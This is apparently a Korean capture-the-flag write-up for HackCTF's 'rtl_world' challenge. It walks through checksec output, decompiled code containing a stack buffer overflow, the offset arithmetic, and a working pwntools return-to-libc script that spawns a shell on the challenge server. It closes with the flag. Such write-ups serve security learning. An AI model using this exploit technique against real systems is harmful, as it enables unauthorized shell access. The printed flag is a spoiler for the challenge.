@@ -1,0 +1,157 @@
+checksec 입력시
+
+CANARY : disabled
+FORTIFY : disabled
+NX : ENABLED
+PIE : disabled
+RELRO : Partial
+
+
+이므로 이번문제 역시 yes_or_no 처럼 쉘코드 사용이 불가능하다.
+또한 eax 이기떄문에 32비트이다.
+
+일단 바이너리 코드를 살펴보자.
+
+##코드
+
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  int v4; // [esp+10h] [ebp-90h]
+  char buf; // [esp+14h] [ebp-8Ch]
+  void *v6; // [esp+94h] [ebp-Ch]
+  void *handle; // [esp+98h] [ebp-8h]
+  void *s1; // [esp+9Ch] [ebp-4h]
+
+  setvbuf(stdout, 0, 2, 0);
+  handle = dlopen("/lib/i386-linux-gnu/libc.so.6", 1);
+  v6 = dlsym(handle, "system");
+  dlclose(handle);
+  for ( s1 = v6; memcmp(s1, "/bin/sh", 8u); s1 = (char *)s1 + 1 )
+    ;
+  puts("\n\nNPC [Village Presient] : ");
+  puts("Binary Boss made our village fall into disuse...");
+  puts("If you Have System Armor && Shell Sword.");
+  puts("You can kill the Binary Boss...");
+  puts("Help me Pwnable Hero... :(\n");
+  printf("Your Gold : %d\n", gold);
+  while ( 1 )
+  {
+    Menu();
+    printf(">>> ");
+    __isoc99_scanf("%d", &v4);
+    switch ( v4 )
+    {
+      case 1:
+        system("clear");
+        puts("[Binary Boss]\n");
+        puts("Arch:     i386-32-little");
+        puts("RELRO:    Partial RELRO");
+        puts("Stack:    No canary found");
+        puts("NX:       NX enabled");
+        puts("PIE:      No PIE (0x8048000)");
+        puts("ASLR:  Enable");
+        printf("Binary Boss live in %p\n", handle);
+        puts("Binart Boss HP is 140 + Armor + 4\n");
+        break;
+      case 2:
+        Get_Money(gold);
+        break;
+      case 3:
+        if ( gold <= 1999 )
+        {
+          puts("You don't have gold... :(");
+        }
+        else
+        {
+          gold -= 1999;
+          printf("System Armor : %p\n", v6);
+        }
+        break;
+      case 4:
+        if ( gold <= 2999 )
+        {
+          puts("You don't have gold... :(");
+        }
+        else
+        {
+          gold -= 2999;
+          printf("Shell Sword : %p\n", s1);
+        }
+        break;
+      case 5:
+        printf("[Attack] > ");
+        read(0, &buf, 0x400u);
+        return 0;
+      case 6:
+        puts("Your Not Hero... Bye...");
+        exit(0);
+        return result;
+      default:
+        continue;
+    }
+  }
+}
+
+
+
+개인적인 생각으로 case 5: 의 read() 함수를 공격해  bof 를 일으킬수 있을거같다.
+
+read@plt ( call ) 까지의 버퍼는 0x8c  ( 140 ) 
+
+총 길이는 140 + 4(SFP) +  4(RET) = 148 
+
+따라서 페이로드는
+
+버퍼(144) + system 주소 + RET(4) + /bin/sh 주소
+
+
+
+system 주소는 IDA 에 보면 system 주소가 있거나 해당 리눅스 gdb info func 명령어를 이용해
+알수있다.
+
+system 주소 : 0x080485b0
+
+/bin/sh 주소 : 0x8048eb1
+
+( /bin/sh 주소는 b*main 을 돌리고 실행한뒤 find "/bin/sh" 를 하면 찾을수있다. 주소가 2개나오는데
+rtl_world 주소를 사용하면 된다.)
+
+
+따라서 페이로드 작성 @@
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3010)
+
+p.recv(1024)
+p.sendline('5')
+p.recvuntil("[Attack] > ")
+
+system_addr = p32(0x080485b0)
+bin_addr = p32(0x8048eb1)
+
+payload = "A"*144
+payload += system_addr
+payload += "A"*4
+payload += bin_addr
+
+p.sendline(payload)
+p.interactive()
+
+
+( 파일명 vi rtl.py ) 로 생성
+
+python rtl.py 하면
+
+cat flag 를 입력하면 flag 가 나온다.
+
+HackCTF{17_w45_4_6r347_r7l_w0rld} 
+
+
+
+
+
+
+
